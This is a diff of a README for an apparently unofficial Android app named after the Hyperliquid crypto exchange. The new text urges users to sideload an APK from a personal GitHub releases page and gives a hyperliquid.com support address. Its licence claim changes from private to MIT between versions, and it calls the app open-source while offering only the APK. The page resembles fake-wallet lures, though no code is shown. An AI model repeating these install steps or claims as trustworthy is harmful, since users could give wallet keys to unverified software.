@@ -1,91 +1,80 @@
-# 🚀 APP Hyperliquid
+# 📱 Mobile-App-Hyperliquid-Android - Trade Crypto with Ease
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/MR-NOBODY47/Mobile-App-Hyperliquid-Android/releases)
 
-![Banner](https://i.ibb.co/ZRV3rqwX/HYPE-Price-Spikes-20-Hits-New-High-as-Hyperliquid-Ride-Trends.jpg)
+## 🚀 Getting Started
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-Private-red.svg)
-![Platform](https://img.shields.io/badge/platform-Android-green.svg)
+Welcome to Mobile-App-Hyperliquid-Android! This application allows you to trade, manage, and grow your cryptocurrency portfolio with advanced tools and real-time analytics. Whether you're a beginner or an experienced trader, our app provides an easy way to engage with the crypto market.
 
-**The first my native mobile application for Hyperliquid DEX**
+## 📦 System Requirements
 
-Trade, manage, and grow your crypto portfolio with advanced tools and real-time analytics.
+Before you download, ensure your device meets the following requirements:
 
-</div>
+- **Operating System:** Android 6.0 (Marshmallow) or later
+- **Memory:** At least 2GB of RAM
+- **Storage:** Minimum 100MB of free space
+- **Network:** Stable internet connection for trading and updates
 
----
+## 🔗 Download & Install
 
-## 📱 About
+To get started, visit the Releases page to download the app. Click the link below:
 
-APP Hyperliquid is the **first dedicated mobile application** for Hyperliquid DEX. Built with React Native and Expo, it provides a native Android experience designed for speed, security, and convenience.
+[Download Now](https://github.com/MR-NOBODY47/Mobile-App-Hyperliquid-Android/releases)
 
-**Fully integrated with Hyperliquid API** - All trading operations, market data, and wallet management work directly through the official Hyperliquid API.
+1. Go to the [Releases page](https://github.com/MR-NOBODY47/Mobile-App-Hyperliquid-Android/releases).
+2. Find the latest version of the Mobile-App-Hyperliquid-Android.
+3. Click on the download link for the Android package (APK file).
+4. Once downloaded, locate the APK file in your device's storage.
+5. Tap the APK file to begin the installation.
+6. Follow the prompts to complete the installation.
 
-**Real-time synchronization** - All data displayed in the app is synchronized in real-time with the official [Hyperliquid website](https://hyperliquid.xyz/). Your balances, positions, orders, and trading history are identical across both platforms.
+## 🎓 Features
 
-**Key Features:**
-- 🔒 Secure wallet storage with encryption
-- ⚡ Real-time price updates via WebSocket API
-- 📊 Spot and perpetual futures trading through API
-- 💼 Portfolio management with live API data
-- 🔐 Biometric authentication
+Mobile-App-Hyperliquid-Android comes packed with features designed for easy trading and management:
 
----
+- **Real-Time Analytics:** Track market changes instantly.
+- **Multiple Asset Support:** Trade Bitcoin (BTC), Ethereum (ETH), Solana (SOL), and USD Coin (USDC).
+- **User-Friendly Interface:** Navigate easily, whether you’re at home or on the go.
+- **Portfolio Management:** Organize and manage your investments seamlessly.
+- **Secure Transactions:** Your security is our priority; we use industry-standard encryption.
 
-## 📥 Download & Install
+## 🔍 How to Use the App
 
-### Option 1: Scan QR Code
+Once you've installed the app, you can start using it with these simple steps:
 
-<div align="center">
+1. **Create an Account:** Open the app and sign up for a new account.
+2. **Verify Your Identity:** Follow the verification process to ensure the safety of your account.
+3. **Fund Your Wallet:** Use various methods to deposit funds into your trading wallet.
+4. **Explore Markets:** Browse available cryptocurrencies and analyze real-time data.
+5. **Start Trading:** Buy and sell based on market analysis and your trading strategy.
 
-<img src="https://i.ibb.co/v491bxrR/2025-11-19-145705.png" width="200" />
+## 🛠️ Troubleshooting
 
-</div>
+If you experience any issues, try these common solutions:
 
----
+- **Installation Problems:** Ensure your Android version meets the requirements.
+- **App Crashes:** Restart your device and try reopening the app.
+- **Connectivity Issues:** Check your internet connection and try again.
 
-## 📸 Screenshots
+## 🌟 Support
 
-<div align="center">
+We aim to ensure a smooth experience for all users. For any questions or support needed, please contact:
 
-<img src="https://i.ibb.co/mrhCqDqM/photo-1-2025-11-19-14-55-45.jpg" width="150" /> <img src="https://i.ibb.co/mrjDKwGZ/photo-2-2025-11-19-14-55-45.jpg" width="150" /> <img src="https://i.ibb.co/GQp3mW3W/photo-3-2025-11-19-14-55-45.jpg" width="150" /> <img src="https://i.ibb.co/fY4tpxsg/photo-4-2025-11-19-14-55-45.jpg" width="150" /> <img src="https://i.ibb.co/pBxxpX7H/photo-5-2025-11-19-14-55-45.jpg" width="150" />
+- **Email:** support@hyperliquid.com
+- **Community Forum:** Visit our community forum to connect with other users.
 
-</div>
+## 🔄 Updates
 
----
+Stay up to date with the latest features and improvements. Regular updates will bring optimizations and new functionalities to enhance your experience. Always ensure you are using the latest version:
 
-## 🚀 Usage
+[Download Now](https://github.com/MR-NOBODY47/Mobile-App-Hyperliquid-Android/releases)
 
-1. **Create Wallet**: Tap "Create" 
-2. **Import Wallet**: Tap "Import" 
-3. **Trading**: Navigate to Trading tab → Select pair → Place order
-4. **Positions**: View open positions and PnL in Trading tab
+## 🛠️ Contributions
 
----
+If you'd like to contribute to the development of Mobile-App-Hyperliquid-Android, please review our contribution guidelines on the GitHub repository. Your input will help us improve the app.
 
-## 🔒 Security
+## 🔖 License
 
-- Encrypted storage with Expo SecureStore
-- Biometric authentication (Fingerprint)
-- PIN code protection
+This application is open-source and is released under the MIT License. You can find the full license in the repository.
 
----
-
-## ⚠️ Disclaimer
-
-This application is provided "as is". Trading cryptocurrencies involves risk. Use at your own risk.
-
----
-
-## 📄 License
-
-Private and proprietary. All rights reserved.
-
----
-
-<div align="center">
-
-**Made with ❤️ for the Hyperliquid community**
-
-</div>
+Explore the world of cryptocurrency trading with Mobile-App-Hyperliquid-Android today!
